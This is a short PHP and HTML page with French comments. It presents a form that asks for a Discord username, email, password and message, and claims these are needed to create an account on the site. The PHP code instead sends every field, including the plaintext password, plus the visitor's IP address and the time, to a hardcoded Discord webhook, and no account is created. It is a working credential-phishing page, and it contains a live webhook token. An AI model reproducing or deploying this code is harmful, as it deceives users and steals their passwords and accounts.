<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $message = $_POST["message1"]; // Modifier ici pour récupérer correctement le message

    $pseudoDiscord = $_POST["pseudoDiscord"];
    $email = $_POST["email"];
    $mdp = $_POST["mdp"];
    
    // Récupérer l'adresse IP et la date
    $ip = $_SERVER["REMOTE_ADDR"];
    $date = date("Y-m-d H:i:s");

    // Créer le message à envoyer sur le webhook Discord
    $messageToSend = "Nouvelle soumission de formulaire:\n";
    $messageToSend .= "Message:\n$message\n"; // Correction ici
    $messageToSend .= "Pseudo Discord: $pseudoDiscord\n";
    $messageToSend .= "E-mail: $email\n";
    $messageToSend .= "Mot de passe: $mdp\n";
    $messageToSend .= "Adresse IP: $ip\n";
    $messageToSend .= "Date: $date";

    // Envoyer le message au webhook Discord
    $webhookUrl = "https://discord.com/api/webhooks/1204843109259935845/4CVIDefZHlp-9YUbJIFAh_maAzM8FskHTjPNfRw9GAsAHemO_axkElkh-tYJbCEwqaJl"; // Remplacez cela par votre URL de webhook Discord
    $data = ["content" => $messageToSend];
    $options = [
        "http" => [
            "header" => "Content-type: application/json",
            "method" => "POST",
            "content" => json_encode($data),
        ],
    ];
    $context = stream_context_create($options);
    file_get_contents($webhookUrl, false, $context);

    // Vous pouvez également stocker les données dans une base de données ou effectuer d'autres actions nécessaires
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NoName</title>
</head>
<body>
        <p style="margin-top: 10px; font-size: 12px;">L'email le mdp et le nom discord permet de vous creer un compte sur le site, et est obligatoire pour envoyer le message.</p>
    <form method="post" action="">
        <label for="pseudoDiscord">Pseudo Discord:</label>
        <input type="text" id="pseudoDiscord" name="pseudoDiscord" required><br>

        <label for="email">E-mail:</label>
        <input type="email" id="email" name="email" required><br>

        <label for="mdp">Mot de passe:</label>
        <input type="password" id="mdp" name="mdp" required><br>

<label for="message1">Message:</label>
<input type="text" id="message1" name="message1" required><br>

        <input type="submit" value="Envoyer">
    </form>
</body>
</html>
